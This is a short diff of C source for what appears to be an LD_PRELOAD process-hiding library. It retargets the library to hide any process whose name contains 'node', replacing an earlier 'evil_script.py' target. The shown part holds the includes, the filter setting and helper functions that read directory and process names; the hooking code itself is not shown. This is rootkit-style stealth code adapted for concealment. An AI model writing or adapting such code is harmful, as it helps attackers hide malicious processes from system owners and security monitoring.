@@ -1,19 +1,14 @@
 #define _GNU_SOURCE
-
 #include <stdio.h>
 #include <dlfcn.h>
 #include <dirent.h>
 #include <string.h>
 #include <unistd.h>
 
-/*
- * Every process with this name will be excluded
- */
-static const char* process_to_filter = "evil_script.py";
+// Define your process name here; any process which has 'node' in it, will be hidden
+static const char* process_to_filter = "node";
 
-/*
- * Get a directory name given a DIR* handle
- */
+// Get a directory name given a DIR* handle
 static int get_dir_name(DIR* dirp, char* buf, size_t size)
 {
     int fd = dirfd(dirp);
@@ -32,9 +27,7 @@ static int get_dir_name(DIR* dirp, char* buf, size_t size)
     return 1;
 }
 
-/*
- * Get a process name given its pid
- */
+// Get a process name given its pid
 static int get_process_name(char* pid, char* buf)
 {
     if(strspn(pid, "0123456789") != strlen(pid)) {
